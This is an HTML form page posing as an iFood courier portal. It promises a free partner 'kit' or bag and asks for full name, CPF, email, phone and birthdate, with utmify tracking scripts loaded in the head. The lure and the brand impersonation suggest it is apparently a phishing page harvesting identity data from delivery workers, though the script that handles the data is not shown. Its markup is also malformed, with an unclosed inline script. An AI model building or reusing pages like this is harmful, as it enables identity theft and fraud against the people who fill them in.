<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#EA1D2C">
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <title>iFood Entregador - Dados pessoais</title>
    <meta name="description" content="Informe seus dados para continuar o resgate do kit parceiro iFood.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css?v=3.0">
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>

<script>
        window.pixelId = "69879d3cc070d5501c7e3fde";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);

<body data-page="personal">
    

    <header class="header">
        <div class="logo-container">
            <img src="assets/ifoodentregadores.webp" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
        </div>
    </header>

    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>

    <main class="container">
        <section class="step" aria-hidden="false">
            <div class="step-header">
                <span class="step-count">Seus Dados</span>
                <div class="progress-bar">
                    <div class="progress" style="width: 55%"></div>
                </div>
            </div>

            <h2>Dados de Identificação</h2>
            <p>Precisamos identificar você para vincular a Bag ao seu CPF.</p>

            <div id="personal-error" class="form-error hidden" role="alert"></div>

            <form id="personal-form" class="data-form" novalidate>
                <div class="input-group">
                    <input type="text" id="fullname" class="floating-input" placeholder=" " required
                        autocomplete="name" spellcheck="false">
                    <label for="fullname" class="floating-label">Nome Completo</label>
                </div>

                <div class="input-group">
                    <input type="tel" id="cpf" class="floating-input" placeholder=" " maxlength="14" inputmode="numeric"
                        autocomplete="off" pattern="[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{2}" required>
                    <label for="cpf" class="floating-label">CPF</label>
                </div>

                <div class="input-group">
                    <input type="email" id="email" class="floating-input" placeholder=" " required autocomplete="email">
                    <label for="email" class="floating-label">E-mail</label>
                </div>

                <div class="input-group">
                    <input type="tel" id="phone" class="floating-input" placeholder=" " maxlength="15" inputmode="numeric"
                        autocomplete="tel" required>
                    <label for="phone" class="floating-label">Telefone</label>
                </div>

                <div class="input-group">
                    <input type="tel" id="birthdate" class="floating-input" placeholder=" " maxlength="10"
                        inputmode="numeric" autocomplete="bday" pattern="[0-9]{2}/[0-9]{2}/[0-9]{4}" required>
                    <label for="birthdate" class="floating-label">Data de Nascimento</label>
                </div>

                <div class="action-stack">
                    <button type="submit" class="btn-primary">Continuar</button>
                </div>
            </form>
        </section>
    </main>

    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>

    <footer class="footer">
        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
    </footer>

    <script src="script.js?v=5.0" defer></script>
</body>

</html>
